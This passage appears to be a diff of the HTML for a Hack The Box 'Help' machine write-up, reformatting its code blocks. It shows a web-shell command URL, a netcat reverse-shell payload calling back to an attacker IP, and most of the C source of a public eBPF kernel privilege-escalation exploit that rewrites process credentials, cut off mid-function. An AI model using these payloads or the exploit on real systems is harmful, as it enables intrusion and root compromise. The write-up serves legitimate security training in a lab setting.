 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=whoami
 </code></pre></div></div>
-<p><img src="/images/hackthebox/help/20.png" alt="">
+<p><img src="/images/hackthebox/help/20.png" alt=""><br>
 <br> It’s working, let’s get a reverse shell, I used this payload (url encoded) :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f
 </code></pre></div></div>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff
 </code></pre></div></div>
-<p><img src="/images/hackthebox/help/21.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/help/22.png" alt="">
+<p><img src="/images/hackthebox/help/21.png" alt=""><br>
+<br><img src="/images/hackthebox/help/22.png" alt=""><br>
 <br> We owned user.
 <br></p>
 <hr>
 
 <h2 id="kernel-exploit-privilege-escalation-and-root-flag">Kernel Exploit, Privilege Escalation and Root Flag</h2>
 <p><br> Privilege escalation on this machine was very easy, just a kernel exploit. One of the first things to check after getting a shell is the system info :
-<code class="highlighter-rouge">uname -a</code>
-<img src="/images/hackthebox/help/23.png" alt="">
+<br><code class="highlighter-rouge">uname -a</code>
+<br><img src="/images/hackthebox/help/23.png" alt=""><br>
 <br> That kernel version is vulnerable to a local privilege escalation vulnerability and there’s an <a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener noreferrer">exploit</a> published for it.
-<code class="highlighter-rouge">exploit.c</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+<br><code class="highlighter-rouge">exploit.c</code> :</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;errno.h&gt;
@@ -361,235 +358,235 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 #include &lt;sys/un.h&gt;
 #include &lt;sys/stat.h&gt;
 #include &lt;stdint.h&gt;
-
-#define PHYS_OFFSET 0xffff880000000000
+</span>
+<span class="cp">#define PHYS_OFFSET 0xffff880000000000
 #define CRED_OFFSET 0x5f8
 #define UID_OFFSET 4
 #define LOG_BUF_SIZE 65536
 #define PROGSIZE 328
+</span>
+<span class="kt">int</span> <span class="n">sockets</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="kt">int</span> <span class="n">mapfd</span><span class="p">,</span> <span class="n">progfd</span><span class="p">;</span>
 
-int sockets[2];
-int mapfd, progfd;
+<span class="kt">char</span> <span class="o">*</span><span class="n">__prog</span> <span class="o">=</span> 	<span class="s">"</span><span class="se">\xb4\x09\x00\x00\xff\xff\xff\xff</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x55\x09\x02\x00\xff\xff\xff\xff</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x18\x19\x00\x00\x03\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x62\x0a\xfc\xff\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x79\x06\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x62\x0a\xfc\xff\x01\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x79\x07\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x62\x0a\xfc\xff\x02\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x79\x08\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\xbf\x02\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x55\x06\x03\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x79\x73\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x7b\x32\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x55\x06\x02\x00\x01\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x7b\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x7b\x87\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
+		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span><span class="p">;</span>
 
-char *__prog = 	"\xb4\x09\x00\x00\xff\xff\xff\xff"
-		"\x55\x09\x02\x00\xff\xff\xff\xff"
-		"\xb7\x00\x00\x00\x00\x00\x00\x00"
-		"\x95\x00\x00\x00\x00\x00\x00\x00"
-		"\x18\x19\x00\x00\x03\x00\x00\x00"
-		"\x00\x00\x00\x00\x00\x00\x00\x00"
-		"\xbf\x91\x00\x00\x00\x00\x00\x00"
-		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
-		"\x07\x02\x00\x00\xfc\xff\xff\xff"
-		"\x62\x0a\xfc\xff\x00\x00\x00\x00"
-		"\x85\x00\x00\x00\x01\x00\x00\x00"
-		"\x55\x00\x01\x00\x00\x00\x00\x00"
-		"\x95\x00\x00\x00\x00\x00\x00\x00"
-		"\x79\x06\x00\x00\x00\x00\x00\x00"
-		"\xbf\x91\x00\x00\x00\x00\x00\x00"
-		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
-		"\x07\x02\x00\x00\xfc\xff\xff\xff"
-		"\x62\x0a\xfc\xff\x01\x00\x00\x00"
-		"\x85\x00\x00\x00\x01\x00\x00\x00"
-		"\x55\x00\x01\x00\x00\x00\x00\x00"
-		"\x95\x00\x00\x00\x00\x00\x00\x00"
-		"\x79\x07\x00\x00\x00\x00\x00\x00"
-		"\xbf\x91\x00\x00\x00\x00\x00\x00"
-		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
-		"\x07\x02\x00\x00\xfc\xff\xff\xff"
-		"\x62\x0a\xfc\xff\x02\x00\x00\x00"
-		"\x85\x00\x00\x00\x01\x00\x00\x00"
-		"\x55\x00\x01\x00\x00\x00\x00\x00"
-		"\x95\x00\x00\x00\x00\x00\x00\x00"
-		"\x79\x08\x00\x00\x00\x00\x00\x00"
-		"\xbf\x02\x00\x00\x00\x00\x00\x00"
-		"\xb7\x00\x00\x00\x00\x00\x00\x00"
-		"\x55\x06\x03\x00\x00\x00\x00\x00"
-		"\x79\x73\x00\x00\x00\x00\x00\x00"
-		"\x7b\x32\x00\x00\x00\x00\x00\x00"
-		"\x95\x00\x00\x00\x00\x00\x00\x00"
-		"\x55\x06\x02\x00\x01\x00\x00\x00"
-		"\x7b\xa2\x00\x00\x00\x00\x00\x00"
-		"\x95\x00\x00\x00\x00\x00\x00\x00"
-		"\x7b\x87\x00\x00\x00\x00\x00\x00"
-		"\x95\x00\x00\x00\x00\x00\x00\x00";
+<span class="kt">char</span> <span class="n">bpf_log_buf</span><span class="p">[</span><span class="n">LOG_BUF_SIZE</span><span class="p">];</span>
 
-char bpf_log_buf[LOG_BUF_SIZE];
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">prog_type</span><span class="p">,</span>
+		  <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prog_len</span><span class="p">,</span>
+		  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">license</span><span class="p">,</span> <span class="kt">int</span> <span class="n">kern_version</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">prog_type</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">insns</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">insns</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">prog_len</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span><span class="p">),</span>
+		<span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">license</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">log_buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">bpf_log_buf</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">log_size</span> <span class="o">=</span> <span class="n">LOG_BUF_SIZE</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+	<span class="p">};</span>
 
-static int bpf_prog_load(enum bpf_prog_type prog_type,
-		  const struct bpf_insn *insns, int prog_len,
-		  const char *license, int kern_version) {
-	union bpf_attr attr = {
-		.prog_type = prog_type,
-		.insns = (__u64)insns,
-		.insn_cnt = prog_len / sizeof(struct bpf_insn),
-		.license = (__u64)license,
-		.log_buf = (__u64)bpf_log_buf,
-		.log_size = LOG_BUF_SIZE,
-		.log_level = 1,
-	};
+	<span class="n">attr</span><span class="p">.</span><span class="n">kern_version</span> <span class="o">=</span> <span class="n">kern_version</span><span class="p">;</span>
 
-	attr.kern_version = kern_version;
+	<span class="n">bpf_log_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 
-	bpf_log_buf[0] = 0;
+	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+<span class="p">}</span>
 
-	return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));
-}
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_create_map</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_map_type</span> <span class="n">map_type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">key_size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value_size</span><span class="p">,</span>
+		   <span class="kt">int</span> <span class="n">max_entries</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="p">.</span><span class="n">map_type</span> <span class="o">=</span> <span class="n">map_type</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">key_size</span> <span class="o">=</span> <span class="n">key_size</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">value_size</span> <span class="o">=</span> <span class="n">value_size</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">max_entries</span> <span class="o">=</span> <span class="n">max_entries</span>
+	<span class="p">};</span>
 
-static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
-		   int max_entries) {
-	union bpf_attr attr = {
-		.map_type = map_type,
-		.key_size = key_size,
-		.value_size = value_size,
-		.max_entries = max_entries
-	};
+	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_CREATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+<span class="p">}</span>
 
-	return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));
-}
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_update_elem</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+	<span class="p">};</span>
 
-static int bpf_update_elem(uint64_t key, uint64_t value) {
-	union bpf_attr attr = {
-		.map_fd = mapfd,
-		.key = (__u64)&amp;key,
-		.value = (__u64)&amp;value,
-		.flags = 0,
-	};
+	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_UPDATE_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+<span class="p">}</span>
 
-	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));
-}
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_lookup_elem</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">key</span><span class="p">,</span>
+		<span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">value</span><span class="p">,</span>
+	<span class="p">};</span>
 
-static int bpf_lookup_elem(void *key, void *value) {
-	union bpf_attr attr = {
-		.map_fd = mapfd,
-		.key = (__u64)key,
-		.value = (__u64)value,
-	};
+	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_LOOKUP_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+<span class="p">}</span>
 
-	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));
-}
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">__exit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"error: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+	<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
 
-static void __exit(char *err) {
-	fprintf(stderr, "error: %s\n", err);
-	exit(-1);
-}
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">prep</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">mapfd</span> <span class="o">=</span> <span class="n">bpf_create_map</span><span class="p">(</span><span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">mapfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
 
-static void prep(void) {
-	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
-	if (mapfd &lt; 0)
-		__exit(strerror(errno));
+	<span class="n">progfd</span> <span class="o">=</span> <span class="n">bpf_prog_load</span><span class="p">(</span><span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">,</span>
+			<span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="p">)</span><span class="n">__prog</span><span class="p">,</span> <span class="n">PROGSIZE</span><span class="p">,</span> <span class="s">"GPL"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 
-	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
-			(struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);
+	<span class="k">if</span> <span class="p">(</span><span class="n">progfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
 
-	if (progfd &lt; 0)
-		__exit(strerror(errno));
+	<span class="k">if</span><span class="p">(</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sockets</span><span class="p">))</span>
+		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
 
-	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
-		__exit(strerror(errno));
+	<span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_ATTACH_BPF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">progfd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">progfd</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+<span class="p">}</span>
 
-	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0)
-		__exit(strerror(errno));
-}
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">writemsg</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-static void writemsg(void) {
-	char buffer[64];
+	<span class="kt">ssize_t</span> <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
 
-	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
+	<span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"write"</span><span class="p">);</span>
+		<span class="k">return</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"short write: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+<span class="p">}</span>
 
-	if (n &lt; 0) {
-		perror("write");
-		return;
-	}
-	if (n != sizeof(buffer))
-		fprintf(stderr, "short write: %lu\n", n);
-}
-
-#define __update_elem(a, b, c) \
+<span class="cp">#define __update_elem(a, b, c) \
 	bpf_update_elem(0, (a)); \
 	bpf_update_elem(1, (b)); \
 	bpf_update_elem(2, (c)); \
 	writemsg();
+</span>
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_value</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">uint64_t</span> <span class="n">value</span><span class="p">;</span>
 
-static uint64_t get_value(int key) {
-	uint64_t value;
+	<span class="k">if</span> <span class="p">(</span><span class="n">bpf_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">))</span>
+		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
 
-	if (bpf_lookup_elem(&amp;key, &amp;value))
-		__exit(strerror(errno));
+	<span class="k">return</span> <span class="n">value</span><span class="p">;</span>
+<span class="p">}</span>
 
-	return value;
-}
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__get_fp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">__update_elem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 
-static uint64_t __get_fp(void) {
-	__update_elem(1, 0, 0);
+	<span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="p">}</span>
 
-	return get_value(2);
-}
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">__update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 
-static uint64_t __read(uint64_t addr) {
-	__update_elem(0, addr, 0);
+	<span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="p">}</span>
 
-	return get_value(2);
-}
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">__write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">__update_elem</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+<span class="p">}</span>
 
-static void __write(uint64_t addr, uint64_t val) {
-	__update_elem(2, addr, val);
-}
+<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">return</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
 
-static uint64_t get_sp(uint64_t addr) {
-	return addr &amp; ~(0x4000 - 1);
-}
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">uint64_t</span> <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">credptr</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">;</span>
 
-static void pwn(void) {
-	uint64_t fp, sp, task_struct, credptr, uidptr;
-
-	fp = __get_fp();
-	if (fp &lt; PHYS_OFFSET)
-		__exit("bogus fp");
+	<span class="n">fp</span> <span class="o">=</span> <span class="n">__get_fp</span><span class="p">();</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus fp"</span><span class="p">);</span>
 	
-	sp = get_sp(fp);
-	if (sp &lt; PHYS_OFFSET)
-		__exit("bogus sp");
+	<span class="n">sp</span> <span class="o">=</span> <span class="n">get_sp</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">sp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus sp"</span><span class="p">);</span>
 	
-	task_struct = __read(sp);
+	<span class="n">task_struct</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">sp</span><span class="p">);</span>
 
-	if (task_struct &lt; PHYS_OFFSET)
-		__exit("bogus task ptr");
+	<span class="k">if</span> <span class="p">(</span><span class="n">task_struct</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus task ptr"</span><span class="p">);</span>
 
-	printf("task_struct = %lx\n", task_struct);
+	<span class="n">printf</span><span class="p">(</span><span class="s">"task_struct = %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
 
-	credptr = __read(task_struct + CRED_OFFSET); // cred
+	<span class="n">credptr</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">task_struct</span> <span class="o">+</span> <span class="n">CRED_OFFSET</span><span class="p">);</span> <span class="c1">// cred
+</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">credptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus cred ptr"</span><span class="p">);</span>
 
-	if (credptr &lt; PHYS_OFFSET)
-		__exit("bogus cred ptr");
+	<span class="n">uidptr</span> <span class="o">=</span> <span class="n">credptr</span> <span class="o">+</span> <span class="n">UID_OFFSET</span><span class="p">;</span> <span class="c1">// uid
+</span>	<span class="k">if</span> <span class="p">(</span><span class="n">uidptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
